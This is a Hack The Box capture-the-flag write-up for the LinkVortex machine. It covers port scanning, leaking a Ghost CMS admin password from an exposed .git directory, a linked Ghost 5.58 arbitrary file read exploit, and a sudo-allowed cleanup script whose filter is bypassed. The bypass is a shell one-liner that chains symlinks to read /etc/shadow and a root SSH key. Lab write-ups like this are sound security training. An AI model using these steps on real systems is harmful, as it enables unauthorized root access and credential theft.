--------------

### CTF-: Hackthebox
### Lab-: LinkVortex

---------------

![image](https://github.com/user-attachments/assets/8d634aaf-9e9d-4915-8758-c94e67d0d2b4)

-----------------

- Rustscan's output

```bash
❯ rustscan -a linkvortex.htb -- -Pn -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/sensei/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.47:22
Open 10.10.11.47:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-23 05:04 WAT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:04
Completed NSE at 05:04, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:04                                                                                                                            
Completed NSE at 05:04, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:04
Completed NSE at 05:04, 0.00s elapsed
Initiating Connect Scan at 05:04
Scanning linkvortex.htb (10.10.11.47) [2 ports]
Discovered open port 22/tcp on 10.10.11.47
Discovered open port 80/tcp on 10.10.11.47
Completed Connect Scan at 05:04, 0.21s elapsed (2 total ports)
Initiating Service scan at 05:04
Scanning 2 services on linkvortex.htb (10.10.11.47)
Completed Service scan at 05:04, 6.47s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.47.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:04
Completed NSE at 05:05, 7.10s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:05
Completed NSE at 05:05, 0.87s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:05
Completed NSE at 05:05, 0.00s elapsed
Nmap scan report for linkvortex.htb (10.10.11.47)
Host is up, received user-set (0.22s latency).
Scanned at 2025-02-23 05:04:49 WAT for 15s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMHm4UQPajtDjitK8Adg02NRYua67JghmS5m3E+yMq2gwZZJQ/3sIDezw2DVl9trh0gUedrzkqAAG1IMi17G/HA=
|   256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKKLjX3ghPjmmBL2iV1RCQV9QELEU+NF06nbXTqqj4dz
80/tcp open  http    syn-ack Apache httpd
| http-methods: 
|_  Supported Methods: POST GET HEAD OPTIONS
|_http-generator: Ghost 5.58
|_http-server-header: Apache
| http-robots.txt: 4 disallowed entries 
|_/ghost/ /p/ /email/ /r/
|_http-favicon: Unknown favicon MD5: A9C6DBDCDC3AE568F4E0DAD92149A0E3
|_http-title: BitByBit Hardware
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Subdomain enumeration-:

![image](https://github.com/user-attachments/assets/89b5bd4a-9217-4c7a-ac8f-9f23834e132a)

- I discovered a git directory after fuzzing the `dev` subdomain.

![image](https://github.com/user-attachments/assets/80cfb290-a26e-4279-a885-6b5146f47385)

- I recovered the `.git` directory with this [GitHacker](https://vedantyaduvanshi.medium.com/linkvortex-htb-writeup-5ec058845d9f) tool.

![image](https://github.com/user-attachments/assets/6fb65072-6a84-4afb-bbd1-ddfb407becb0)

- I grepped for credentials and discovered a password.

![image](https://github.com/user-attachments/assets/0c4810df-10dd-4610-b2e1-e7a0f2d354a3)

- I guessed the email which I presumed should be "admin@linkvortex.htb" which worked.I am logged in as the admin.

![image](https://github.com/user-attachments/assets/0ff543bf-f0d5-455c-be15-62dcee9213bd)

- The dockerfile in the git repo showed the version of the ghost cms.

![image](https://github.com/user-attachments/assets/1e31dccb-be09-44f8-bebb-274a2e6a8ad9)

- This version of Ghost cms is vulnerable to `Arbitrary File Read`.I discovered an exploit [here](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028).I read file `/etc/passwd`.

![image](https://github.com/user-attachments/assets/375ff4d8-c98f-4b6d-8b82-75b032509c3a)

- Then,I noticed a config file provided in the `Dockerfile` which might contain necessary credentials.

![image](https://github.com/user-attachments/assets/82e7c53e-760e-44ec-b414-355b6198fbad)

- I sshed to the server with the credentials.

![image](https://github.com/user-attachments/assets/1a9e249e-4b86-45e2-8f6d-49d5faa3349f)

------------------------

### Privesc with Symlink

------------------------

- I ran `sudo -l` and spotted a rule that allows user `bob` to run a bash script as root.

![image](https://github.com/user-attachments/assets/3fe594a0-cd58-4ad6-bdac-3cb2fc109653)

------------------------

### Code Review of the sh file

----------------------

- File-:

```bash
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```
- The script set a directory `/var/quarantined` to variable `QUAR_DIR` and checks if the variable `CHECK_CONTENT` is set and if it is not set, it sets it  boolean `false`. Then variable `LINK` is set to the first argument.The `LINK` variable must end with `.png` which means it must be a png file.

```bash
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi
```

- The last part of the code check if the file is a symbolic link and it exists with `test -l` and sets the variable `LINK_NAME` to  the basename with `basename <filename>` and the `LINK_TARGET` holds the file which the symbolic link points to.Lastly,it checks if the symlink contains string `etc` or `root` to prevent attackers from reading  critical files.If the first condition is not fulfilled, the `else` statement move the file to `/var/quarantined` and if  variable `$CHECK_CONTENT` is set `true`, the file gets read.

```bash
if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

------------------

### Exploiting it

------------------

- I created  a symlink for file `/etc/shadow` in the home directory.

![image](https://github.com/user-attachments/assets/634bcd4f-06ea-447e-ad7f-ed0a01d1d3d4)

- Then,in another directory,we have to create a symlink to point to our former symlink so that `readlink` will not spot that we are trying to read `/etc/shadow` and exit the script.You can see in the image that it does not point to the original file which is `/etc/shadow` but binary `cat` will read the file.

![image](https://github.com/user-attachments/assets/d054b87e-b665-4b4f-a2d0-700bf322d781)

- Before we execute the script,an env variable `CHECK_CONTENT` must be created and set to `true` with `export`.

```bash
cd ~;ln -s /etc/shadow /home/bob/tpassz.txt;cd /tmp;ln -s /home/bob/tpassz.txt /tmp/rootz.png;
export CHECK_CONTENT=true;sudo -u root /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

![image](https://github.com/user-attachments/assets/0793a57c-18af-4c30-a6bd-5beca73255a3)

- I read the id_rsa file and got root access.

![image](https://github.com/user-attachments/assets/c9a91c1b-c129-446b-a1b8-a07147e7ae6a)

- Root access-:

![image](https://github.com/user-attachments/assets/f0577721-21f3-45ae-aa91-b24959c73369)

------------------

### REFERENCE-:

- [Ghost-5.58 exploit](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028)

------------------





